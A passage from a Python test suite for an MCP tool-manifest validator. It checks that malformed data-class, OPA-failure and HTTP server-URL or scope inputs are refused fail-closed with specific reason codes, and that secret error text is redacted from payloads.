            tools=[{"name": "tool-x", "data_classes": malformed_value}],
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False, f"label={label}: expected fail-closed refusal, got {result}."
        assert result.reason == "mcp_tool_data_classes_shape_invalid", (
            f"label={label}: expected mcp_tool_data_classes_shape_invalid, got {result.reason}."
        )
        assert result.payload["tool_name"] == "tool-x"
        assert result.payload["field"] == "data_classes"
        for key in expected_payload_keys:
            assert key in result.payload, (
                f"label={label}: expected payload key {key!r}, got {sorted(result.payload.keys())}"
            )

    @pytest.mark.parametrize(
        ("malformed_value", "label"),
        [
            (42, "int"),
            (True, "bool"),
            ({"customer_pii": True}, "dict"),
            ("payment_action", "string-not-list"),
            ([42, "payment_action"], "list-with-int"),
            ([None], "list-with-none"),
            (["   "], "list-with-whitespace"),
        ],
    )
    async def test_malformed_data_classes_under_ttl_cache_refused_closed(
        self,
        malformed_value: Any,
        label: str,
    ) -> None:
        """Same fail-closed posture under the TTL-cache gate.
        The shape gate fires before gate 5 even iterates."""
        manifest = _base_manifest(
            tools=[
                {
                    "name": "tool-y",
                    "caching_strategy": "ttl",
                    "data_classes": malformed_value,
                }
            ],
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_tool_data_classes_shape_invalid"
        assert result.payload["tool_name"] == "tool-y"
        assert result.payload["field"] == "data_classes"

    async def test_malformed_data_classes_outside_form_or_ttl_still_refused(
        self,
    ) -> None:
        """Even when no downstream gate would consume the field
        (no form-elicitation, no TTL caching), a malformed
        ``data_classes`` is still refused. The signed-static manifest
        contract requires ``data_classes`` be well-shaped wherever it
        appears; the gate doesn't make exceptions for tools whose
        gates wouldn't fire."""
        manifest = _base_manifest(tools=[{"name": "tool-z", "data_classes": 42}])
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_tool_data_classes_shape_invalid"
        assert result.payload["tool_name"] == "tool-z"

    async def test_first_malformed_tool_wins(self) -> None:
        """If multiple tools are malformed, the first-encountered
        wins (deterministic refusal). Operator sees one specific
        diagnostic, not an aggregated dump."""
        manifest = _base_manifest(
            tools=[
                {"name": "tool-a", "data_classes": ["customer_pii"]},  # well-shaped
                {"name": "tool-b", "data_classes": 42},  # FIRST malformed
                {"name": "tool-c", "data_classes": "another-bad"},
            ],
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_tool_data_classes_shape_invalid"
        assert result.payload["tool_name"] == "tool-b"

    @pytest.mark.parametrize(
        ("well_formed", "label"),
        [
            ([], "empty-list"),
            (["customer_pii"], "single-restricted"),
            (["customer_pii", "payment_action"], "multiple-restricted"),
            (["non-restricted-class"], "single-non-restricted"),
        ],
    )
    async def test_well_formed_data_classes_passes_shape_gate(
        self,
        well_formed: list[str],
        label: str,
    ) -> None:
        """Well-shaped ``data_classes`` (empty list or list of non-empty
        strings) passes the shape gate. Downstream gates may still
        fire on restricted-class intersection, which is what the
        existing form/TTL gates test."""
        manifest = _base_manifest(
            tools=[{"name": "tool-x", "data_classes": well_formed}],
        )
        # No form-elicitation, no TTL → downstream gates don't fire.
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is True, (
            f"label={label}: well-formed data_classes should pass; got {result}"
        )

    async def test_absent_data_classes_passes_shape_gate(self) -> None:
        """A tool that doesn't declare ``data_classes`` at all is
        well-shaped (the field is optional). The shape gate distinguishes
        "absent" from "present-but-malformed"."""
        manifest = _base_manifest(tools=[{"name": "tool-x"}])
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is True

    async def test_well_formed_data_classes_still_refused_at_form_gate(self) -> None:
        """Sanity: the shape gate doesn't short-circuit the form-mode
        restricted-data refusal. A well-shaped ``["customer_pii"]``
        under form elicitation still triggers gate 4 as expected."""
        manifest = _base_manifest(
            mcp={"elicitation_modes": ["form"]},
            tools=[{"name": "t", "data_classes": ["customer_pii"]}],
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_elicitation_form_restricted_data_class"

    async def test_well_formed_data_classes_still_refused_at_ttl_gate(self) -> None:
        """Sanity: same for the TTL-cache gate."""
        manifest = _base_manifest(
            tools=[
                {
                    "name": "t",
                    "caching_strategy": "ttl",
                    "data_classes": ["payment_action"],
                }
            ],
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_caching_ttl_restricted_data_class"


# ---------------------------------------------------------------------------
# T15 R1 P2 #5 — OPA evaluate() failures map to default-deny envelope
# ---------------------------------------------------------------------------


class TestOpaEvaluateFailureDefaultDenies:
    """T15 R1 P2 #5: an installed OPA engine that raises during
    ``evaluate()`` MUST default-deny via ``mcp_sampling_default_denied``
    rather than letting the raw exception propagate. Without the
    wrap, a transient OPA subprocess failure / JSON-decode bug /
    binary-missing-from-PATH would skip the registration-refusal
    evidence path and bypass the closed-enum envelope.
    """

    async def test_opa_evaluate_runtime_error_default_denies(self) -> None:
        """Engine raises ``RuntimeError`` mid-evaluate → default-deny
        with ``opa_evaluate_failed`` reason detail + ``error_type`` in
        payload."""
        from unittest.mock import AsyncMock as _AsyncMock
        from unittest.mock import MagicMock as _MagicMock

        opa_engine = _MagicMock()
        opa_engine.evaluate = _AsyncMock(
            side_effect=RuntimeError("opa: subprocess timeout, stderr: <secret debug>")
        )
        manifest = _base_manifest(mcp={"sampling_supported": True})
        result = await validate_mcp_manifest(manifest, context=_ctx(opa_engine=opa_engine))
        assert result.ok is False
        assert result.reason == "mcp_sampling_default_denied"
        assert result.payload.get("reason_detail") == "opa_evaluate_failed"
        # Class name preserved for diagnostics; raw text NOT included.
        assert result.payload.get("error_type") == "RuntimeError"
        # Sanity: the raw exception's secret-looking text is NOT in
        # the payload anywhere.
        for v in result.payload.values():
            assert "secret debug" not in str(v)
            assert "subprocess timeout" not in str(v)

    async def test_opa_evaluate_cancellation_propagates_unchanged(self) -> None:
        """``CancelledError`` from ``evaluate()`` MUST propagate;
        cancellation is not coerced into a closed-enum refusal."""
        from unittest.mock import AsyncMock as _AsyncMock
        from unittest.mock import MagicMock as _MagicMock

        opa_engine = _MagicMock()
        opa_engine.evaluate = _AsyncMock(side_effect=asyncio.CancelledError)
        manifest = _base_manifest(mcp={"sampling_supported": True})
        with pytest.raises(asyncio.CancelledError):
            await validate_mcp_manifest(manifest, context=_ctx(opa_engine=opa_engine))


# ---------------------------------------------------------------------------
# T15 R1 P2 #6 — HTTP-family manifest shape gate fires before auth probe
# ---------------------------------------------------------------------------


class TestHttpManifestShapeGate:
    """T15 R1 P2 #6: the HTTP-family manifest's ``server_url`` and
    ``scopes`` are read directly from signed TOML and passed into
    :meth:`MCPAuthzClient.acquire_token`. Without this gate:

    - ``scopes = "mcp:tools"`` (string) becomes ``tuple("mcp:tools")``
      downstream — a 9-character tuple whose ``" ".join(...)`` produces
      the wrong scope-grant string and could under-/over-grant tokens.
    - ``[42]`` crashes at the same join site with ``TypeError``.
    - Blank / non-URL ``server_url`` reaches httpx as a malformed URL.

    Catching all three at admission keeps the auth probe + runtime
    invocation paths free of pack-controlled type confusion. The new
    closed-enum reason ``mcp_http_manifest_shape_invalid`` fires
    before any network round-trip.
    """

    @pytest.mark.parametrize(
        ("transport", "label"),
        [
            ("http", "legacy-alias"),
            ("streamable-http", "canonical"),
        ],
    )
    async def test_blank_server_url_refused(self, transport: str, label: str) -> None:
        manifest = _base_manifest(mcp={"transport": transport, "server_url": ""})
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_http_manifest_shape_invalid"
        assert result.payload["field"] == "server_url"

    async def test_whitespace_only_server_url_refused(self) -> None:
        manifest = _base_manifest(mcp={"server_url": "   "})
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_http_manifest_shape_invalid"
        assert result.payload["field"] == "server_url"

    async def test_non_string_server_url_refused(self) -> None:
        manifest = _base_manifest(mcp={"server_url": 42})
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_http_manifest_shape_invalid"
        assert result.payload["field"] == "server_url"
        assert result.payload["declared_type"] == "int"

    async def test_string_scopes_refused(self) -> None:
        """``scopes = "mcp:tools"`` (single string) is the most likely
        author mistake; it would otherwise become a 9-char tuple."""
        manifest = _base_manifest(mcp={"scopes": "mcp:tools"})
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_http_manifest_shape_invalid"
        assert result.payload["field"] == "scopes"
        assert result.payload["declared_type"] == "str"

    async def test_int_scopes_refused(self) -> None:
        manifest = _base_manifest(mcp={"scopes": 42})
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_http_manifest_shape_invalid"
        assert result.payload["field"] == "scopes"

    async def test_list_with_int_scopes_refused(self) -> None:
        """``[42]`` is the join-time TypeError vector."""
        manifest = _base_manifest(mcp={"scopes": [42]})
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_http_manifest_shape_invalid"
        assert result.payload["field"] == "scopes"
        assert result.payload["malformed_entry_type"] == "int"

    async def test_list_with_blank_string_refused(self) -> None:
        manifest = _base_manifest(mcp={"scopes": ["mcp:tools", "   "]})
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_http_manifest_shape_invalid"
        assert result.payload["field"] == "scopes"

    async def test_well_formed_http_manifest_passes(self) -> None:
        """Sanity: the gate doesn't break the happy path."""
        manifest = _base_manifest()  # baseline is HTTP + valid shape
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is True

    async def test_stdio_manifest_skips_http_shape_gate(self) -> None:
        """STDIO transports don't go through this gate (they have
        their own gates 6.a-d). A blank server_url under STDIO does
        not produce ``mcp_http_manifest_shape_invalid``."""
        manifest = _base_manifest(
            mcp={
                "transport": "stdio",
                "server_url": "",
                "command": "/usr/local/bin/x",
                "args": ["--config"],
                "env_allowlist": [],
            }
        )
        result = await validate_mcp_manifest(
            manifest,
            context=_ctx(stdio_command_allowlist=frozenset({"/usr/local/bin/x"})),
        )
        assert result.ok is False
        # STDIO Decision Lock fires; the new HTTP gate is bypassed.
        assert result.reason == "mcp_stdio_disabled_in_sprint_5"
